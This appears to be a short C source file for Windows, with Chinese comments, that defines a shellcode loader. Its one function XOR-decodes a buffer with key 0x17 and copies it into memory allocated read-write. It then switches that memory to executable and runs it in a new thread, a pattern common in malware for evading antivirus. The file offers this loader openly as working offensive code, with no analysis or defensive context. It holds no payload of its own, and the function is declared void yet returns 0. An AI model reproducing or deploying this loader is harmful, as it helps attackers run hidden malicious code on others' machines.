#define _CRT_SECURE_NO_WARNINGS
#include "head.h"
#include <Windows.h>


void load_shellcode(char* argc_buf, int argc_bufsize) {
 
    DWORD dwThreadId;	//线程Id
    HANDLE hThread;		//线程句柄
    DWORD dwOldProtect;	//内存页属性
 
    for (int i = 0; i < argc_bufsize; i++)
    {
        argc_buf[i] ^= 0x17;
    }
    char* shellcode = (char*)VirtualAlloc(
        NULL,
        4096,
        MEM_COMMIT,
        PAGE_READWRITE  //只申请可读可写
    );
    if (shellcode) 
    {
        memcpy(shellcode, argc_buf, argc_bufsize); //将shellcode复制到可读可写的内存中
        VirtualProtect(shellcode, argc_bufsize, PAGE_EXECUTE, &dwOldProtect); //更改属性为可执行
        hThread = CreateThread(
            NULL, // 安全描述符
            NULL, // 栈的大小
            shellcode, // 函数
            NULL, // 参数
            NULL, // 线程标志
            &dwThreadId // 线程ID
        );
        WaitForSingleObject(hThread, INFINITE);
    }
   
    return 0;
}
